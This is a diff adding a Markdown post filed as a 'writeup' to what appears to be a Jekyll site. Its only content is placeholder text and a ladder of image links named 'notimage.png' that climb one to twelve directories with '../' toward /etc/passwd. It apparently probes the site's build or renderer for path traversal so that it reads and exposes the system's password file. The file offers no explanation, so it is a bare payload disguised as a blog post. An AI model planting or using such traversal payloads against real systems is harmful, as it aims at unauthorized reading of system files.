@@ -1,0 +1,21 @@
+---
+layout: post
+category: writeups
+---
+
+aaaa
+
+![notimage.png](../etc/passwd)
+![notimage.png](../../etc/passwd)
+![notimage.png](../../../etc/passwd)
+![notimage.png](../../../../etc/passwd)
+![notimage.png](../../../../../etc/passwd)
+![notimage.png](../../../../../../etc/passwd)
+![notimage.png](../../../../../../../etc/passwd)
+![notimage.png](../../../../../../../../etc/passwd)
+![notimage.png](../../../../../../../../../etc/passwd)
+![notimage.png](../../../../../../../../../../etc/passwd)
+![notimage.png](../../../../../../../../../../../etc/passwd)
+![notimage.png](../../../../../../../../../../../../etc/passwd)
+
+
